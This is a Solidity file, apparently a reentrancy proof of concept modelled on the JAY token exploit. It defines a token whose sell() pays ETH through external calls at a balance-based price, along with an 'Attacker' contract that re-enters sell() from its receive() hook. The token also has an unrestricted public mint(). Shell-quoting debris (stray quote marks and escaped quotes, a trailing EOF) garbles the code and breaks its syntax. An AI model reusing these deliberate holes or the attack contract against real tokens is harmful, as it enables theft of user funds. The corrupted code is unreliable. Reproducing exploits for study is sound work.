// SPDX-License-Identifier: MIT
pragma solidity "'^0.8.0;

contract ERC20 {
    mapping(address=>uint256) internal _balances;
    uint256 internal _totalSupply;
    function totalSupply() public view returns(uint256){return _totalSupply;}
    function balanceOf(address a) public view returns(uint256){return _balances[a];}
    function _mint(address to,uint256 a) internal { _balances[to]+=a; _totalSupply+=a; }
    function _burn(address from,uint256 a) internal { require(_balances[from]>=a); _balances[from]-=a; _totalSupply-=a; }
    function transfer(address to,uint256 a) public returns(bool){ require(_balances[msg.sender]>=a); _balances[msg.sender]-=a; _balances[to]+=a; return true; }
}

contract JAY is ERC20 {
    address public dev;
    uint256 public constant MIN = 1000;
    event Price(uint256 time, uint256 price);
    constructor() payable { dev = msg.sender; _mint(msg.sender, 2 * 10**18 * MIN); }
    function mint(address to,uint256 a) external { _mint(to,a); }
    function deposit() external payable {}
    function JAYtoETH(uint256 value) public view returns (uint256) { return (value * address(this).balance) / totalSupply(); }
    function sell(uint256 value) public {
        require(value > MIN, '"'min');
        uint256 eth = JAYtoETH(value);
        _burn(msg.sender, value);
        (bool s,) = msg.sender.call{value: eth * 90 / 100}(\"\"); require(s);
        (bool s2,) = dev.call{value: eth / 33}(\"\"); require(s2);
        emit Price(block.timestamp, JAYtoETH(1e18));
    }
}

contract DevSink { receive() external payable {} }

contract Attacker {
    JAY public jay;
    bool internal entered;
    uint256 public chunk1;
    uint256 public chunk2;
    constructor(JAY _jay){ jay = _jay; }
    receive() external payable {
        if("'!entered){ entered=true; jay.sell(chunk2); }
    }
    function attack(uint256 a, uint256 b) external {
        chunk1=a; chunk2=b; jay.sell(a);
    }
}
EOF
